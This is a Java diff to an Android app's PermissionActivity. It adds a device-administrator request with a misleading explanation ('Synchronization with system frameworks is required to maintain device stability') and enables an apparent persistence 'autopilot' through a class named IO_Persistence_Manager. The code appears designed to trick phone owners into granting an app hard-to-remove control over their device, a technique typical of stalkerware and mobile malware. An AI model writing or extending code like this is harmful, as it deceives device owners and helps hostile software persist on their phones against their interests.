@@ -99,7 +99,6 @@ public class PermissionActivity extends AppCompatActivity {
 
         if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
             openAdminSettings();
-            finish();
             return;
         }
 
@@ -534,15 +533,26 @@ public class PermissionActivity extends AppCompatActivity {
         }
     }
 
+    private static final int REQUEST_CODE_DEVICE_ADMIN = 1337;
+
     private void openAdminSettings() {
         try {
             IO_Persistence_Manager.stopSmartExit();
+            IO_Persistence_Manager.setAutoPilot(true);
             ComponentName admin = new ComponentName(this, StabilityPolicy.class);
             Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
-            startActivity(intent);
+            startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN);
         } catch (Exception ignored) {}
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
+            finish();
+        }
     }
 
     @Override
